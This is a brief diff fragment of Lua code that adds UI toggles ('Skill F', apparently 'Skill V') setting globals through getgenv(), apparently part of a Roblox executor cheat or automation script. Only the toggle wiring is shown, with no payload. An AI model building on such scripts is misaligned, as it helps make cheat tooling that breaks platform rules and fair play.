+    getgenv().SkillV = Value
+end)
+Toggle = ChooseSkill:AddToggle("Toggle", {Title = "Skill F", Default = false })
+Toggle:OnChanged(function(Value)
+    getgenv().SkillF = Value
 end)
